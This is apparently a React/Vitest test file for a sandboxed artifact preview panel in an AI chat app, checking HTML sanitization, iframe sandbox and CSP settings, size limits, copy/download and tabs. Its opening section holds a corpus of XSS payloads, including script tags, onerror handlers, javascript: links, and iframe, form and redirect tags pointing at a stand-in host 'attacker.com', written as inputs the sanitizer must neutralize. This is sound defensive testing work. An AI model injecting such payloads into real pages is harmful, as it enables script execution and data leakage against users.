import { render, screen } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { describe, it, expect, vi, beforeEach } from 'vitest';
import { ArtifactPanel } from '../components/ArtifactPanel';
import { MessageItem } from '../components/MessageItem';
import { prepareHtmlArtifact, sanitizeHtml, ARTIFACT_MAX_BYTES } from '../utils/sanitizeArtifact';
import { Message } from '../api';

describe('ArtifactPanel Component & Security Sandbox (Phase 7)', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  describe('1. Malicious Payload Corpus & Inert Verification', () => {
    const maliciousCorpus = [
      { name: '<script> tag', payload: '<script>window.pwned = true;</script><p>Hello</p>', blocked: '<script' },
      { name: '<img onerror>', payload: '<img src="x" onerror="alert(1)">', blocked: 'onerror' },
      { name: '<a href="javascript:">', payload: '<a href="javascript:alert(1)">Click</a>', blocked: 'javascript:' },
      { name: '<iframe> tag', payload: '<iframe src="https://attacker.com/steal"></iframe>', blocked: '<iframe' },
      { name: '<form action>', payload: '<form action="https://attacker.com/leak"><input name="q" /></form>', blocked: '<form' },
      { name: '<meta refresh>', payload: '<meta http-equiv="refresh" content="0;url=https://attacker.com">', blocked: 'refresh' },
      { name: '<base href>', payload: '<base href="https://attacker.com/">', blocked: '<base' },
      { name: 'remote <img src=http://...>', payload: '<img src="http://attacker.com/pixel.png">', blocked: 'http://attacker.com/pixel.png' },
      { name: 'remote <img src=https://...>', payload: '<img src="https://attacker.com/pixel.png">', blocked: 'https://attacker.com/pixel.png' },
    ];

    maliciousCorpus.forEach(({ name, payload, blocked }) => {
      it(`renders ${name} inert and neutralizes hostile code`, () => {
        const sanitized = sanitizeHtml(payload);
        expect(sanitized).not.toContain(blocked);

        const { wrappedHtml } = prepareHtmlArtifact('Attack Test', payload);
        expect(wrappedHtml).toContain('Content-Security-Policy');
        expect(wrappedHtml).not.toContain(blocked);
      });
    });

    it('asserts CSP meta tag is present with strict directives in srcdoc', () => {
      const { container } = render(
        <ArtifactPanel
          isOpen={true}
          artifact={{
            id: 'art-csp-1',
            title: 'CSP Test Artifact',
            type: 'html',
            content: '<h1>Content</h1>',
          }}
          onClose={vi.fn()}
        />
      );

      const iframe = container.querySelector('iframe');
      expect(iframe).toBeInTheDocument();
      const srcDoc = iframe?.getAttribute('srcdoc') || '';

      expect(srcDoc).toContain('default-src \'none\'');
      expect(srcDoc).toContain('style-src \'unsafe-inline\'');
      expect(srcDoc).toContain('img-src data:');
      expect(srcDoc).toContain('font-src data:');
      expect(srcDoc).toContain('base-uri \'none\'');
      expect(srcDoc).toContain('form-action \'none\'');
    });

    it('enforces empty sandbox attribute with NO allow-scripts and NO allow-same-origin', () => {
      const { container } = render(
        <ArtifactPanel
          isOpen={true}
          artifact={{
            id: 'art-sandbox-1',
            title: 'Sandbox Token Verification',
            type: 'html',
            content: '<p>Protected content</p>',
          }}
          onClose={vi.fn()}
        />
      );

      const iframe = container.querySelector('iframe');
      expect(iframe).toBeInTheDocument();
      expect(iframe).toHaveAttribute('sandbox', '');

      const sandboxAttr = iframe?.getAttribute('sandbox') || '';
      expect(sandboxAttr).not.toContain('allow-scripts');
      expect(sandboxAttr).not.toContain('allow-same-origin');
      expect(sandboxAttr).not.toContain('allow-forms');
      expect(sandboxAttr).not.toContain('allow-popups');
      expect(sandboxAttr.trim()).toBe('');
    });

    it('renders mandatory visible security notice', () => {
      render(
        <ArtifactPanel
          isOpen={true}
          artifact={{
            id: 'art-notice-1',
            title: 'Notice Check',
            type: 'html',
            content: '<p>Text</p>',
          }}
          onClose={vi.fn()}
        />
      );

      expect(
        screen.getByText('Sandboxed preview: scripts and external requests are blocked.')
      ).toBeInTheDocument();
    });
  });

  describe('2. Oversized Artifact Handling (ARTIFACT_MAX_BYTES)', () => {
    it('shows size warning and blocks rendering when artifact exceeds 200,000 bytes', () => {
      const hugeHtml = '<p>' + 'A'.repeat(ARTIFACT_MAX_BYTES + 50) + '</p>';
      render(
        <ArtifactPanel
          isOpen={true}
          artifact={{
            id: 'art-huge-1',
            title: 'Oversized Artifact',
            type: 'html',
            content: hugeHtml,
          }}
          onClose={vi.fn()}
        />
      );

      expect(screen.getByRole('alert')).toBeInTheDocument();
      expect(
        screen.getByText(/Artifact size exceeds 200,000 bytes limit/i)
      ).toBeInTheDocument();
    });
  });

  describe('3. Action Buttons: Copy and Download', () => {
    it('copies raw content to clipboard when Copy button is clicked', async () => {
      const user = userEvent.setup();
      const writeTextSpy = vi.spyOn(navigator.clipboard, 'writeText').mockResolvedValue();

      const testContent = '<h1>Weekly Retention Analysis</h1>';
      render(
        <ArtifactPanel
          isOpen={true}
          artifact={{
            id: 'art-copy-1',
            title: 'Copy Test',
            type: 'html',
            content: testContent,
          }}
          onClose={vi.fn()}
        />
      );

      const copyBtn = screen.getByRole('button', { name: /Copy artifact content/i });
      await user.click(copyBtn);

      expect(writeTextSpy).toHaveBeenCalledWith(testContent);
      expect(screen.getByText('Copied')).toBeInTheDocument();
    });

    it('creates download anchor and triggers file download when Download button is clicked', async () => {
      const user = userEvent.setup();

      // Mock URL.createObjectURL and URL.revokeObjectURL
      const mockUrl = 'blob:http://localhost:3000/mock-blob-uuid';
      const createObjectURLSpy = vi.fn().mockReturnValue(mockUrl);
      const revokeObjectURLSpy = vi.fn();
      window.URL.createObjectURL = createObjectURLSpy;
      window.URL.revokeObjectURL = revokeObjectURLSpy;

      render(
        <ArtifactPanel
          isOpen={true}
          artifact={{
            id: 'art-dl-1',
            title: 'Quarterly Growth Strategy',
            type: 'html',
            content: '<h1>Strategy Doc</h1>',
          }}
          onClose={vi.fn()}
        />
      );

      const downloadBtn = screen.getByRole('button', { name: /Download artifact/i });
      await user.click(downloadBtn);

      expect(createObjectURLSpy).toHaveBeenCalled();
      expect(revokeObjectURLSpy).toHaveBeenCalledWith(mockUrl);
    });
  });

  describe('4. Tab Switching: Preview vs Source', () => {
    it('switches to Source tab and displays raw text in pre element', async () => {
      const user = userEvent.setup();
      const rawMarkdown = '# PMF Playbook\n- Identify core ICP\n- Validate retention';

      const { container } = render(
        <ArtifactPanel
          isOpen={true}
          artifact={{
            id: 'art-tabs-1',
            title: 'Playbook',
            type: 'markdown',
            content: rawMarkdown,
          }}
          onClose={vi.fn()}
        />
      );

      const sourceTab = screen.getByRole('button', { name: 'Source' });
      await user.click(sourceTab);

      const pre = container.querySelector('pre');
      expect(pre).toBeInTheDocument();
      expect(pre).toHaveTextContent('# PMF Playbook');
    });
  });

  describe('5. Markdown Preview Link Security', () => {
    it('renders outbound links in Markdown with rel="noopener noreferrer" and target="_blank"', () => {
      const markdownWithLinks = '[Lenny Newsletter](https://www.lennysnewsletter.com)';

      render(
        <ArtifactPanel
          isOpen={true}
          artifact={{
            id: 'art-md-link',
            title: 'Markdown Links',
            type: 'markdown',
            content: markdownWithLinks,
          }}
          onClose={vi.fn()}
        />
      );

      const link = screen.getByRole('link', { name: 'Lenny Newsletter' });
      expect(link).toHaveAttribute('href', 'https://www.lennysnewsletter.com');
      expect(link).toHaveAttribute('target', '_blank');
      expect(link).toHaveAttribute('rel', 'noopener noreferrer');
    });

    it('neutralizes javascript: links in Markdown content', () => {
      const hostileMarkdown = '[Click Here](javascript:alert("hacked"))';

      render(
        <ArtifactPanel
          isOpen={true}
          artifact={{
            id: 'art-md-js-link',
            title: 'Hostile Link',
            type: 'markdown',
            content: hostileMarkdown,
          }}
          onClose={vi.fn()}
        />
      );

      const link = screen.getByRole('link', { name: 'Click Here' });
      expect(link.getAttribute('href')).not.toContain('javascript:');
    });
  });

  describe('6. Assistant Message "Open artifact" button integration', () => {
    it('displays "Open artifact" button when assistant message includes an artifact', async () => {
      const user = userEvent.setup();
      const handleOpenArtifact = vi.fn();

      const testMsg: Message = {
        id: 'msg-with-art',
        session_id: 'sess-1',
        role: 'assistant',
        content: "Here is your requested retention one-pager.",
        citations: [],
        tool_trace: [],
        degraded: false,
        created_at: new Date().toISOString(),
        artifact: {
          id: 'art-123',
          title: 'Retention One-Pager',
          type: 'html',
        },
      };

      render(
        <MessageItem
          message={testMsg}
          onOpenArtifact={handleOpenArtifact}
        />
      );

      const openBtn = screen.getByRole('button', { name: /Open artifact: Retention One-Pager/i });
      expect(openBtn).toBeInTheDocument();

      await user.click(openBtn);
      expect(handleOpenArtifact).toHaveBeenCalledWith(testMsg.artifact);
    });
  });
});
